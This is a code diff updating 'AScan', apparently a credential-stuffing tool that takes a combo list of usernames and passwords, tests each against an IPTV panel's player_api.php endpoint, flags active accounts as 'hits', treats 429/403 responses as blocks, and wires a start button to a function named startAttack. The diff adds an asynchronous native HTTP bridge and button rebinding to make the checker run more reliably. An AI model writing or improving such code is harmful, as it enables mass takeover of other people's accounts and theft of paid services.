@@ -1,21 +1,76 @@
 (function(){
-  if(window.__ascanFixV111) return; window.__ascanFixV111=1;
+  if(window.__ascanFixV112) return; window.__ascanFixV112=1;
 
   function tmsg(m){ try{ if(typeof toast==='function') toast(m); }catch(e){} }
   function hasNative(){ return !!(window.AScanNative && typeof AScanNative.httpGet==='function'); }
-  function nativeHttp(url, timeoutMs){
-    try{ return JSON.parse(AScanNative.httpGet(url, timeoutMs|0)); }
-    catch(e){ return {ok:false,status:0,error:String(e),body:''}; }
+
+  window.__ascanCbMap = window.__ascanCbMap || {};
+  window.__ascanCb = function(id, b64){
+    var cb = window.__ascanCbMap[id];
+    if(!cb) return;
+    delete window.__ascanCbMap[id];
+    try{ cb(b64); }catch(e){}
+  };
+
+  function b64ToUtf8(b64){
+    try{
+      var bin = atob(b64);
+      var bytes = new Uint8Array(bin.length);
+      for(var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
+      return new TextDecoder('utf-8').decode(bytes);
+    }catch(e){
+      try{ return decodeURIComponent(escape(atob(b64))); }catch(e2){ return ''; }
+    }
   }
-  window.hasNative=hasNative; window.nativeHttp=nativeHttp;
+
+  function nativeHttpAsync(url, timeoutMs){
+    return new Promise(function(resolve){
+      if(!(window.AScanNative && typeof AScanNative.httpGetAsync==='function')){
+        resolve({ok:false,status:0,error:'sem httpGetAsync',body:''});
+        return;
+      }
+      var id = 'c' + Date.now().toString(36) + Math.random().toString(36).slice(2,8);
+      var done = false;
+      var timer = setTimeout(function(){
+        if(done) return;
+        done = true;
+        delete window.__ascanCbMap[id];
+        resolve({ok:false,status:0,error:'timeout',body:''});
+      }, (timeoutMs|0) + 5000);
+      window.__ascanCbMap[id] = function(b64){
+        if(done) return;
+        done = true;
+        clearTimeout(timer);
+        try{
+          var txt = b64ToUtf8(b64);
+          resolve(JSON.parse(txt));
+        }catch(e){
+          resolve({ok:false,status:0,error:String(e),body:''});
+        }
+      };
+      try{
+        AScanNative.httpGetAsync(url, timeoutMs|0, id);
+      }catch(e){
+        if(done) return;
+        done = true;
+        clearTimeout(timer);
+        resolve({ok:false,status:0,error:String(e),body:''});
+      }
+    });
+  }
 
   if(typeof fetchText==='function'){
     window.__origFetchText=fetchText;
     window.fetchText=async function(url,ms){
       if(hasNative()){
-        var j=nativeHttp(url, ms||25000);
-        if(j&&j.ok) return j.body||'';
-        throw new Error((j&&(j.error||('HTTP '+j.status)))||'falha nativa');
+        try{
+          var raw = AScanNative.httpGet(url, ms||25000);
+          var j = JSON.parse(raw);
+          if(j&&j.ok) return j.body||'';
+          throw new Error((j&&(j.error||('HTTP '+j.status)))||'falha nativa');
+        }catch(e){
+          return window.__origFetchText(url,ms);
+        }
       }
       return window.__origFetchText(url,ms);
     };
@@ -24,11 +79,11 @@
   if(typeof testarNoServidor==='function'){
     window.__origTestar=testarNoServidor;
     window.testarNoServidor=async function(cred,servidor){
-      if(hasNative()){
+      if(hasNative() && window.AScanNative.httpGetAsync){
         var user=cred.user, pass=cred.pass, url=servidor.url;
         var api=url+'/player_api.php?username='+encodeURIComponent(user)+'&password='+encodeURIComponent(pass);
         try{
-          var j=nativeHttp(api,10000);
+          var j=await nativeHttpAsync(api, 12000);
           if(window.state&&!state.isScanRunning) return {status:'stopped'};
           if(!j||j.status===429||j.status===403) return {status:'error',errorType:'block'};
           if(!j.ok||j.status!==200) return {status:'invalida'};
@@ -36,7 +91,9 @@
           if(!data||!data.user_info) return {status:'invalida'};
           if(String(data.user_info.status||'').toLowerCase()==='active') return {status:'hit',data:data};
           return {status:'invalida'};
-        }catch(e){ return {status:'error',errorType:'connection'}; }
+        }catch(e){
+          return {status:'error',errorType:'connection'};
+        }
       }
       return window.__origTestar(cred,servidor);
     };
@@ -104,9 +161,10 @@
       return all; }catch(e){ return []; }
   }
   function rebind(sel, fn){
-    var el=document.querySelector(sel); if(!el||!el.parentNode) return;
+    var el=document.querySelector(sel); if(!el||!el.parentNode) return null;
     var n=el.cloneNode(true); el.parentNode.replaceChild(n,el);
-    n.addEventListener('click',function(e){e.preventDefault();e.stopPropagation();fn();});
+    n.addEventListener('click',function(e){e.preventDefault();e.stopPropagation();fn(e);});
+    return n;
   }
   function doCopy(){
     var h=allRaws(); if(!h||!h.length){ tmsg('Nenhum hit.'); return; }
@@ -134,27 +192,25 @@
   rebind('.btn-copy', doCopy);
   rebind('#btn-download', doDownload);
 
-  refreshProxyStatus();
-  if(hasNative()) tmsg('AScan 1.1.2 OK');
-
-  function ensureScanFeedback(){
+  rebind('.btn-start', function(){
     try{
-      var btn=document.querySelector('.btn-start');
-      if(!btn || btn.__ascanScanBound) return;
-      btn.__ascanScanBound=1;
-      btn.addEventListener('click', function(){
-        setTimeout(function(){
-          try{
-            var srv=(document.getElementById('servidorUnico')||{}).value||'';
-            if(!String(srv).trim()){ tmsg('Preencha o servidor!'); return; }
-            var hasFile=false;
-            try{ var f=document.getElementById('combo'); hasFile=f&&f.files&&f.files[0]; }catch(e){}
-            var hasOnline=!!(window.loadedComboText);
-            if(!hasFile && !hasOnline){ tmsg('Selecione combo (.txt) ou use combo online!'); }
-          }catch(e){}
-        }, 30);
-      }, true);
-    }catch(e){}
-  }
-  ensureScanFeedback();
+      var srv=(document.getElementById('servidorUnico')||{}).value||'';
+      if(!String(srv).trim()){ tmsg('Preencha o servidor!'); return; }
+      var hasFile=false;
+      try{ var f=document.getElementById('combo'); hasFile=f&&f.files&&f.files[0]; }catch(e){}
+      var hasOnline=!!(window.loadedComboText);
+      if(!hasFile && !hasOnline){ tmsg('Selecione combo ou use online!'); return; }
+      if(typeof startAttack!=='function'){ tmsg('startAttack ausente'); return; }
+      tmsg('Iniciando scan...');
+      var p=startAttack();
+      if(p&&typeof p.then==='function'){
+        p.then(function(){ tmsg('Scan finalizado'); }).catch(function(err){ tmsg('Erro scan: '+err); });
+      }
+    }catch(err){
+      tmsg('Erro ao iniciar: '+err);
+    }
+  });
+
+  refreshProxyStatus();
+  if(hasNative()) tmsg('AScan 1.1.3 OK');
 })();
